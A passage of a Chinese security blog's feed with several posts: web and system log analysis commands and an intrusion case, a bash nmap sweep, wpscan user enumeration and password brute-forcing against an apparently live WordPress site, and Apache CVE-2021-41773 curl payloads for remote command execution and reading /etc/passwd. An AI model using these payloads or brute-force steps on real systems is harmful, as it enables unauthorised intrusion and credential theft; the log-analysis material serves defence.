; USER=root ; COMMAND=/sbin/shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、/var/log/yum.log</p><p>软件安装升级卸载日志：</p><pre class="line-numbers language-yum" data-language="yum"><code class="language-yum">install gccyum install gcc[root@bogon ~]# more /var/log/yum.logJul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>摘自：<a href="http://xiaocaibi.top/posts/5abdae1b.html">http://xiaocaibi.top/posts/5abdae1b.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Web日志分析</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/54f8ad8e.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/54f8ad8e.html</id>
    <published>2021-10-14T11:33:05.000Z</published>
    <updated>2021-10-21T02:46:43.149Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-Web日志"><a href="#0x01-Web日志" class="headerlink" title="0x01 Web日志"></a>0x01 Web日志</h2><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p><p>我们来看一条Apache的访问日志：</p><p>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] “GET /login.html HTTP/1.1” 200 786 “-“ “Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36”</p><p>通过这条Web访问日志，我们可以清楚的得知用户在扫描IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你的网站的哪个页面，是否访问成功</p><p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p><h2 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h2><p>在对WEB日志进行分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p><p>第一种：确定入侵时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p><p>第二种：攻击者在入侵网站后，通常会留下后面维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析</p><p>常用分析工具：</p><p>Windows下，推荐用EmEditor进行日志分析，支持大文本，搜索效率还不错。</p><p>Linux下，使用Shell命令组合查询分析。</p><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧</p><p>Apache日志分析技巧：</p><pre class="line-numbers language-none"><code class="language-none">1、列出访问次数最多的IP命令：cut -d- -f 1 log_file|uniq -c | sort -rn | head -202、查看当天有多少个IP访问awk '{print $1}' log_file|sort|uniq|wc -l3、查看某一页面被访问的次数grep "/index.php" log_file | wc -l4、查看每一个IP访问了多少个页面:awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file5、将每个IP访问的页面数进行从小到打的排序awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n6、查看某一个IP访问了哪些页面：grep ^111.111.111.111 log_file | awk '{print $1,$7}'7、去掉搜索引擎统计当天的页面：awk '{print $12,$1} log_file' | grep ^\"Mozilla | awk '{print $2}' |sort | uniq | wc -l8、查看2018年6月21日14时这个内有多少IP访问：awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h2><p>Web日志分析案例：通过nginx代理转发到内网服务器某站点目录下被传了多个图片木马。虽然II7下不能解析，但是还想找出谁通过什么路径上传的。</p><p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问ip。这时候，如何去识别不同的访问者和攻击源呢?</p><p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p><p>1、定位攻击源</p><p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理ip，并不能通过ip来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p><p><img src="https://z3.ax1x.com/2021/10/14/5lvKjx.png"></p><pre class="line-numbers language-none"><code class="language-none">Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、搜索相关日志记录</p><p>通过筛选与该浏览器指纹相关的日志记录，可以清晰地看到攻击者的攻击路径。</p><p><img src="https://z3.ax1x.com/2021/10/14/5lxSaD.png"></p><p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p><pre class="line-numbers language-none"><code class="language-none">A、攻击者访问首页和登录页B、攻击者访问MsgSjlb.aspx和MsgSebd.aspxC、攻击者访问Xzuser.aspxD、攻击者多次POST（怀疑通过这个页面上传模块缺陷）E、攻击者访问图片木马<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录管理即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p><h2 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h2><p>统计爬虫：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token operator">-</span><span class="token constant">E</span> <span class="token string">'Googelbot|Baiduspider'</span> <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1 }'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计浏览器：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> grep <span class="token operator">-</span>v <span class="token operator">-</span><span class="token constant">E</span> <span class="token string">'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>r <span class="token operator">-</span>n <span class="token operator">|</span> head <span class="token operator">-</span>n <span class="token number">100</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IP统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token string">'23/May/2019'</span> <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">'{print $1"."$2"."$3"."$4}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计网段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1}'</span> <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span><span class="token string">'.'</span> <span class="token string">'{print $1"."$2"."$3".0}'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>r <span class="token operator">-</span>n <span class="token operator">|</span> head <span class="token operator">-</span>n <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统计域名：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $2}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HTTP Status：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{print $9}'</span><span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span class="token number">5056585</span> <span class="token number">304</span><span class="token number">1125579</span> <span class="token number">200</span>   <span class="token number">7602</span> <span class="token number">400</span>      <span class="token number">5</span> <span class="token number">301</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>URL统计：</p><pre class="line-numbers language-none"><code class="language-none">cat /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>文件流量统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{sum[$7]+=$10} END {for(i in sum){print sum[i],i}}'</span><span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>moregrep <span class="token string">' 200 '</span> <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span>awk <span class="token string">'{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'</span><span class="token operator">|</span>sort <span class="token operator">-</span>rn<span class="token operator">|</span>more<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>URL访问量统计：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">cat <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $7}'</span> <span class="token operator">|</span> egrep <span class="token string">'\?|&amp;'</span> <span class="token operator">|</span> sort <span class="token operator">|</span> uniq <span class="token operator">-</span>c <span class="token operator">|</span> sort <span class="token operator">-</span>rn <span class="token operator">|</span> more<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本运行速度：</p><p>查出运行速度最慢的脚本</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">grep <span class="token operator">-</span>v <span class="token number">0</span>$ <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">'\" '</span> <span class="token string">'{print $4" " $1}'</span> web<span class="token punctuation">.</span>log <span class="token operator">|</span> awk <span class="token string">'{print $1" "$8}'</span> <span class="token operator">|</span> sort <span class="token operator">-</span>n <span class="token operator">-</span>k <span class="token number">1</span> <span class="token operator">-</span>r <span class="token operator">|</span> uniq <span class="token operator">&gt;</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>slow_url<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>IP，URL抽取：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">tail <span class="token operator">-</span>f <span class="token operator">/</span>www<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">23.</span>log <span class="token operator">|</span> grep <span class="token string">'/test.html'</span> awk <span class="token string">'{print $1" "$7}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>摘自：<a href="http://xiaocaibi.top/posts/196d13a8.html">http://xiaocaibi.top/posts/196d13a8.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Bashsh脚本</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/95e32794.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/95e32794.html</id>
    <published>2021-10-13T14:23:45.000Z</published>
    <updated>2021-10-21T02:45:27.717Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>bash脚本</p><p>为了告诉操作系统正在使用bash来编写这个脚本，我们使用#!后跟/bin/bash</p><p>echo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token builtin class-name">echo</span> <span class="token string">"Hello World"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>运行时需要+x权限</p><p><img src="https://z3.ax1x.com/2021/10/13/5MUG24.png"></p><p>接收用户输入</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token builtin class-name">echo</span> <span class="token string">"What is your name?"</span><span class="token builtin class-name">read</span> name<span class="token builtin class-name">echo</span> <span class="token string">"Welcomem, <span class="token variable">$name</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/13/5MUzJU.png"></p><p>创建一个简单的ip扫描仪</p><pre class="line-numbers language-none"><code class="language-none">#! /bin/bashecho "Enter the ip address"read ipnmap -sP $ip/24 | grep scan | cut -d " " -f 5 | head -n -1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/13/5MwiUx.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="linux命令" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/linux%E5%91%BD%E4%BB%A4/"/>
    
    <category term="Bash脚本" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/Bash%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>wpscan</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/bbc010a7.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/bbc010a7.html</id>
    <published>2021-10-10T04:19:21.000Z</published>
    <updated>2021-10-21T02:46:51.498Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://z3.ax1x.com/2021/10/10/5Al2FS.png"></p><p>开始扫描</p><p><img src="https://z3.ax1x.com/2021/10/10/5A1Nmq.png"></p><p>robots.txt爆出连个目录，但是/wp-admin/返回原网址，/wp-admin/admin-ajax.php返回0</p><p>两个都没有</p><p>xml-rpc漏洞，References: 下面列举出了一些漏洞详情网址，但是不太会用，主要是ddos，也有说有其他用途</p><p><a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner%EF%BC%9A">https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner：</a></p><p><img src="https://z3.ax1x.com/2021/10/10/5A3t8e.png"></p><p>然后发现readme.html页面，没太大用</p><p>wp-cron，也是访问/wp-cron.php发起ddos攻击，没太大用</p><p><img src="https://z3.ax1x.com/2021/10/10/5A8BQJ.png"></p><p>发现使用的主题是hgsq，没有找到漏洞(The version could not be determined)</p><p><img src="https://z3.ax1x.com/2021/10/10/5A87wt.png"></p><p>自动枚举可能的漏洞，没有发现</p><p>接下来就爆用户名了</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爬出来50条这里就不写出来了</p><p>接下来就是爆密码</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -U username.txt -P password.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆出来很多弱密码，就不写出来了</p><p>总结，kali的这个不知道怎么设置，–threads参数无效，–wordlist参数也说没有</p><pre class="line-numbers language-none"><code class="language-none">Scan Aborted: invalid option: -threadsScan Aborted: invalid option: -wordlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="wpscan使用" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/wpscan%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>src edu extraction</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/49262a27.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/49262a27.html</id>
    <published>2021-10-09T13:27:00.000Z</published>
    <updated>2021-10-21T02:46:35.668Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>提取src.sjtu.edu.cn的漏洞数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url<span class="token operator">=</span><span class="token string">'https://src.sjtu.edu.cn/rank/firm/?province=9&amp;page='</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        data<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content        <span class="token comment"># print(data)</span>        <span class="token comment"># print(data.decode('utf-8'))</span>        soup<span class="token operator">=</span>etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        result<span class="token operator">=</span>soup<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//td[@class="am-text-center"]/a/text()'</span><span class="token punctuation">)</span>        <span class="token comment"># print(result)</span>        results<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token comment"># print(results)</span>        resultss<span class="token operator">=</span>results<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#取空</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>resultss<span class="token punctuation">)</span>        <span class="token keyword">for</span> edu <span class="token keyword">in</span> resultss<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>edu<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'src.txt'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>edu<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    yeshu<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'搜索的页数：'</span><span class="token punctuation">)</span>    src<span class="token punctuation">(</span>yeshu<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="数据提取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/"/>
    
    <category term="脚本" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>wpscan使用</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/2b63819c.html</id>
    <published>2021-10-09T07:21:54.000Z</published>
    <updated>2021-10-21T02:46:58.528Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ddd</p><p>kali版wpscan</p><p>安装</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/wpscanteam/wpscan.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新漏洞库</p><pre class="line-numbers language-none"><code class="language-none">wpscan --update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用</p><p>扫描站点</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url --enumerate twpscan --url url -e t#缩写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>插件扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>主题/插件漏洞扫描</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e vtwpscan --url url -e vp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>references后面显示的是漏洞详情网址，基本是配合msf漏洞利用模块</p><p>枚举用户名</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -e u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>暴力破解</p><pre class="line-numbers language-none"><code class="language-none">wpscan --url url -U &lt;username路径或username&gt; -P &lt;password路径&gt; --max-threads 50<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="wpscan" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/wpscan/"/>
    
  </entry>
  
  <entry>
    <title>Apache CVE-2021-41773</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/59b5dccf.html</id>
    <published>2021-10-09T02:43:17.000Z</published>
    <updated>2021-10-21T02:45:14.537Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>漏洞原因：</p><p>此漏洞由不安全的配置触发</p><p>如果网站配置中，将 根目录 / 配置为</p><pre class="line-numbers language-none"><code class="language-none">Require all granted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则可以通过cgi-bin/目录，配合 ../</p><p>只存在于apache2.4.49，在其他版本不存在</p><p>RCE</p><pre class="line-numbers language-none"><code class="language-none">curl --data "echo;id" 'http://your-ip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取</p><pre class="line-numbers language-none"><code class="language-none">curl -v --path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/09/5iU6ud.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="RCE" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/RCE/"/>
    
    <category term="任意文件读取" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
    
  </entry>
  
  <entry>
    <title>linux命令</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/8ebbbb0f.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/8ebbbb0f.html</id>
    <published>2021-10-08T11:09:58.000Z</published>
    <updated>2021-10-21T02:45:56.536Z</updated>
    
